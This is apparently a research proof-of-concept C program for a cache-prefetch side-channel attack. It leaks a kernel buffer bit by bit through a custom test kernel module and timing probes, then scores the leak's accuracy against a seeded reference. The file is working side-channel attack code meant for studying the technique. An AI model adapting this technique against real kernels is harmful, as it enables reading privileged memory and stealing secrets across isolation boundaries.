#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <time.h>

#include "common.h"

// 文件描述符，用于与内核模块通信
static int module_fd;

// colliding load instruction
// 指向加载（load）指令的函数指针，这个指令将是侧信道攻击的目标，因为它在用户空间和内核空间之间共享。
static load_gadget_f gadget;

// colliding buffer
// 用于缓存冲突的缓冲区，它与内核模块中的某个缓冲区映射到相同的物理内存页，但处于不同的虚拟地址空间。
static uint8_t* colliding_buffer;

// threshold to distinguish cache hit from cache miss
// 用于区分缓存命中和缓存未命中的时间阈值
static uint64_t threshold;

// 尝试泄露单个比特的函数
uint64_t leak_bit(size_t offset, size_t stride) {

    // 刷新上次访问的缓冲区位置和探测位置，确保它们不在缓存中
    flush(colliding_buffer + 2 * stride); 
    flush(colliding_buffer + 3 * stride); 
    mfence();

    // 通过ioctl调用内核模块，使内核访问其内部的kernel_buffer。
    // 如果offset参数指向的内核内存位置是“1”，则内核会访问该位置，导致相应的缓存行被加载。
    ioctl(module_fd, CMD_GADGET_CF, offset);
    mfence();
   
    // 在用户空间进行更多的访问。
    // 如果之前内核的访问命中了我们的“猜测”（即offset对应的内核秘密位为1），
    // 那么这里对colliding_buffer的访问会遵循一定的步幅（stride），并可能触发预取（prefetch）。
    // 否则，如果猜测不正确，则不会触发预取。
    gadget(colliding_buffer + 1 * stride);
    mfence();
    gadget(colliding_buffer + 2 * stride);
    mfence();

    // 探测colliding_buffer + 3 * stride处的访问时间。
    // 如果访问时间很短（低于阈值），表示被预取（或直接缓存命中），
    // 这意味着内核的访问确实发生了，因此秘密位是“1”。
    // 否则，如果访问时间较长（高于阈值），表示未被预取（缓存未命中），
    // 意味着内核的访问没有发生，秘密位是“0”。
    return probe(colliding_buffer + 3 * stride) < threshold;
}

// 获取纳秒级时间的辅助函数
static uint64_t get_time_nanos() {
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t); // 获取单调时钟时间
    return t.tv_sec * 1000000000ull + t.tv_nsec;    // 转换为纳秒
}

// 泄露单个字节的函数
static uint8_t leak_byte(size_t offset) {
    uint8_t byte = 0;
    for(int bit = 0; bit < 8; bit ++) {
        // 循环8次，每次泄露一个比特
        // offset * 8 + bit：计算当前要泄露的比特在整个秘密数据中的偏移量
        // (rand64() % 2048) + 512：生成一个随机的步幅，用于避免缓存的固定模式，增加攻击的随机性
        byte |= leak_bit(offset * 8 + bit, (rand64() % 2048) + 512) << bit; // 将泄露的比特按位或到byte中
    }
    return byte;
}

// 分析泄露结果的函数，计算正确率、误报和漏报
static void analyze_leakage(uint8_t reference, uint8_t observed, uint32_t* correct, uint32_t* false_positives, uint32_t* false_negatives, uint32_t* positives, uint32_t* negatives) {
    for(uint32_t i = 0; i < 8; i++) {
        uint32_t mask = 1 << i;
        // 统计真实的正例和负例
        if(reference & mask){
            *positives += 1;
        } else {
            *negatives += 1;
        }
        // 检查参考值和观察值是否不同
        if((reference ^ observed) & mask) { // 如果两个比特位不相同
            if(observed & mask) {
                // 观察到的是1，但参考是0 -> 误报
                *false_positives += 1;
            } else {
                // 观察到的是0，但参考是1 -> 漏报
                *false_negatives += 1;
            }
        } else {
            // 相同 -> 正确
            *correct += 1;
        }
    }
}

int main(int argc, char** argv) {
    // 打开内核模块设备文件
    module_fd = open(FETCHPROBE_MODULE_DEVICE_PATH, O_RDONLY);

    if(module_fd < 0) {
        fputs("failed to open kernel module!\n", stderr);
        return -1;
    }
    
    // 从内核获取必要的信息（如内核缓冲区地址和内核加载指令地址）
    struct fetchprobe_kernel_info info;
    ioctl(module_fd, CMD_INFO, &info);
    printf("kernel buffer: 0x%016zx\nkernel load: 0x%016zx\n", info.kernel_buffer, info.kernel_access_cf);
    
    // 映射与内核缓冲区发生冲突的缓冲区。
    // map_gadget将内核的加载指令映射到用户空间可执行的地址。
    gadget = map_gadget(info.kernel_access_cf & 0x7fffffffffffull);
    // map_buffer映射一个用户空间缓冲区，其物理地址可能与内核缓冲区重叠。
    // (info.kernel_buffer & 0x7fffffffffffull) - PAGE_SIZE * 2：根据内核缓冲区地址计算冲突缓冲区的起始地址。
    // PAGE_SIZE * 5：映射的缓冲区大小。
    // + PAGE_SIZE * 2：可能是为了调整到合适的偏移量，使得与内核缓冲区重叠。
    colliding_buffer = map_buffer((info.kernel_buffer & 0x7fffffffffffull) - PAGE_SIZE * 2, PAGE_SIZE * 5) + PAGE_SIZE * 2;
    printf("colliding buffer: 0x%016zx\ncolliding load: 0x%016zx\n", (uintptr_t)colliding_buffer, (uintptr_t)gadget);
    
    // 计算区分缓存命中和未命中的阈值
    threshold = calculate_threshold();
    printf("threshold: %zu\n", threshold);
    
    // 使用时间戳作为随机数生成器的初始种子
    uint64_t shared_seed = _rdtsc();
    
    // 使用伪随机数据初始化内核缓冲区
    ioctl(module_fd, CMD_RESET, shared_seed);
   
    // 泄露整个缓冲区的数据
    // bitvector for accesses (0 = no access detected, 1 = access detected)
    uint8_t leakage[BUFFER_SIZE] = {0}; // 用于存储泄露结果的数组
    mfence();
    uint64_t start = get_time_nanos();  // 开始计时
    mfence();
    for(int offset = 0; offset < BUFFER_SIZE; offset ++) {
        leakage[offset] = leak_byte(offset);    // 逐字节泄露
    }
    mfence();
    uint64_t end = get_time_nanos();    // 结束计时
    mfence();
    printf("time: %zu\n", end - start); // 打印泄露所需时间
    
    // 检查泄露的准确性
    seed = shared_seed; // 重新设置随机数种子，以便生成与内核缓冲区初始化时相同的随机数据作为参考
    uint32_t correct = 0;
    uint32_t false_positives = 0;
    uint32_t false_negatives = 0;
    uint32_t positives = 0;
    uint32_t negatives = 0;
    for(int i = 0; i < BUFFER_SIZE; i++) {
        // analyze_leakage((uint8_t)(rand64() % 256), leakage[i], ...): 生成与内核中一致的随机参考数据
        analyze_leakage((uint8_t)(rand64() % 256), leakage[i], &correct, &false_positives, &false_negatives, &positives, &negatives);
    }
    printf("correct: %u\n", correct);
    printf("positives: %u\n", positives);
    printf("negatives: %u\n", negatives);
    printf("false positives: %u\n", false_positives);
    printf("false negatives: %u\n", false_negatives);
    
    // no need to unmap, etc. OS will take care of that for us :)
    // 无需手动解除映射等操作，操作系统会在程序退出时自动处理
}	

